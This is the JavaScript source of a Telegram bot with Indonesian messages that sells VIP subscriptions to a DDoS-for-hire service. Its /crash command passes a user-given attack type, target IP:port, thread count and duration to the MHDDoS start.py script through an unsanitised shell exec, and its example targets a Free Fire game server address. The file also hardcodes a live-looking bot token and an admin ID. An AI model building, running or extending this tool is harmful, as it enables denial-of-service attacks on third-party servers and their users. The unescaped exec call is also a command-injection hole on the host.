const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const sqlite3 = require('sqlite3').verbose();
const { DateTime, Duration } = require('luxon');

const BOT_TOKEN = "7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM";
const ADMIN_ID = "6471584924";
const START_PY_PATH = "/workspaces/MHDDoS/start.py";

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const db = new sqlite3.Database("users.db");
const cooldowns = {};
const activeAttacks = {};

// Create VIP users table if not exists
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS vip_users (
            id INTEGER PRIMARY KEY,
            telegram_id INTEGER UNIQUE,
            expiration_date TEXT
        )
    `);
});

bot.onText(/\/start/, (msg) => {
    const telegramId = msg.from.id;

    db.get("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", [telegramId], (err, row) => {
        let vipStatus;
        if (row) {
            const expirationDate = DateTime.fromSQL(row.expiration_date);
            if (DateTime.now() > expirationDate) {
                vipStatus = "❌ *Bukan Anggota VIP.*";
            } else {
                const daysRemaining = Math.ceil(expirationDate.diffNow('days').days);
                vipStatus = `✅ Pelanggan VIP!\n⏳ Hari Tersisa: ${daysRemaining} Hari\n📅 Kedaluarsa: ${expirationDate.toFormat('dd/MM/yyyy HH:mm:ss')}`;
            }
        } else {
            vipStatus = "❌ *Tidak Mempunyai Akses VIP.*";
        }

        const markup = {
            inline_keyboard: [[
                {
                    text: "Owner LORDHOZOO",
                    url: `tg://user?id=${ADMIN_ID}`
                }
            ]]
        };

        bot.sendMessage(
            msg.chat.id,
            `🤖 *DDoS Ping 999+ [Free Fire]!*\n\n\`\`\`${vipStatus}\`\`\`\n📌 *Info:*\n\`\`\`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>\`\`\`\n💡 *Contoh*\n\`\`\`/crash UDP 143.92.125.230:10013 10 900\`\`\`\nEXECUTOR LORDHOZOO LAG GAME`,
            {
                reply_markup: markup,
                parse_mode: "Markdown",
                reply_to_message_id: msg.message_id
            }
        );
    });
});

bot.onText(/\/vip/, (msg) => {
    if (msg.from.id.toString() !== ADMIN_ID) {
        bot.sendMessage(msg.chat.id, "❌ Lu Bukan Owner😏.", { reply_to_message_id: msg.message_id });
        return;
    }

    const args = msg.text.split(/\s+/);
    if (args.length !== 3) {
        bot.sendMessage(
            msg.chat.id,
            "❌ Formatnya tidak valid. Gunakan: `/vip <ID> <BERAPA HARI>`",
            { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
        );
        return;
    }

    const telegramId = args[1];
    const days = parseInt(args[2]);
    const expirationDate = DateTime.now().plus({ days }).toFormat("yyyy-MM-dd HH:mm:ss");

    db.run(
        "INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date) VALUES (?, ?)",
        [telegramId, expirationDate],
        function(err) {
            if (err) {
                bot.sendMessage(msg.chat.id, "❌ Error saat menambahkan VIP.", { reply_to_message_id: msg.message_id });
            } else {
                bot.sendMessage(
                    msg.chat.id,
                    `✅ Pengguna ${telegramId} Terdaftar VIP ${days} Hari.`,
                    { reply_to_message_id: msg.message_id }
                );
            }
        }
    );
});

bot.onText(/\/crash/, (msg) => {
    const telegramId = msg.from.id;

    db.get("SELECT expiration_date FROM vip_users WHERE telegram_id = ?", [telegramId], (err, row) => {
        if (!row) {
            bot.sendMessage(msg.chat.id, "❌ Anda tidak memiliki izin untuk menggunakan perintah ini.", { reply_to_message_id: msg.message_id });
            return;
        }

        const expirationDate = DateTime.fromSQL(row.expiration_date);
        if (DateTime.now() > expirationDate) {
            bot.sendMessage(msg.chat.id, "❌ Akses VIP Anda Sudah Habis", { reply_to_message_id: msg.message_id });
            return;
        }

        if (cooldowns[telegramId] && Date.now() - cooldowns[telegramId] < 10000) {
            bot.sendMessage(
                msg.chat.id,
                "❌ Tunggu 10 Detik Untuk Melakukan Serangan DDoS. Dan Jangan Lupa Untuk Mematikan Serangan Sebelumnya..",
                { reply_to_message_id: msg.message_id }
            );
            return;
        }

        const args = msg.text.split(/\s+/);
        if (args.length !== 5 || !args[2].includes(':')) {
            bot.sendMessage(
                msg.chat.id,
                "❌ *kak lordhozoo cantik imut salah yang bener ya 👰*\n\n📌 *Info:*\n`/crash <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n💡 *Contoh:*\n`/crash UDP 143.92.125.230:10013 10 900`",
                { parse_mode: "Markdown", reply_to_message_id: msg.message_id }
            );
            return;
        }

        const attackType = args[1];
        const ipPort = args[2];
        const threads = args[3];
        const duration = args[4];
        const command = `python ${START_PY_PATH} ${attackType} ${ipPort} ${threads} ${duration}`;

        const process = exec(command);
        activeAttacks[telegramId] = process;
        cooldowns[telegramId] = Date.now();

        const markup = {
            inline_keyboard: [[
                {
                    text: "⛔ Matikan DDoS",
                    callback_data: `stop_${telegramId}`
                }
            ]]
        };

        bot.sendMessage(
            msg.chat.id,
            `*[✅] Serangan DDoS Active - Gacor KAK LORDHOZOO [✅]*\n\n🌐 *Alamat IP:* ${ipPort}\n⚙️ *Type:* ${attackType}\n👰‍♀️ *Threads:* ${threads}\n⏳ *Ping (ms):* ${duration}\n\nLORDHOZOO DDOS GAME`,
            {
                reply_markup: markup,
                parse_mode: "Markdown",
                reply_to_message_id: msg.message_id
            }
        );
    });
});

bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    if (!data.startsWith('stop_')) return;

    const telegramId = parseInt(data.split('_')[1]);
    const message = callbackQuery.message;

    if (callbackQuery.from.id !== telegramId) {
        bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Hanya pengguna yang memulai serangan yang dapat menghentikannya." });
        return;
    }

    if (activeAttacks[telegramId]) {
        activeAttacks[telegramId].kill();
        delete activeAttacks[telegramId];

        bot.answerCallbackQuery(callbackQuery.id, { text: "✅ Berhasil menangkis serangan." });
        bot.editMessageText(
            "*[⛔] SERANGAN SELESAI[⛔]*",
            {
                chat_id: message.chat.id,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        )
        .then(() => {
            setTimeout(() => {
                bot.deleteMessage(message.chat.id, message.message_id);
            }, 3000);
        });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: "❌ Tidak Menemukan Serangan" });
    }
});
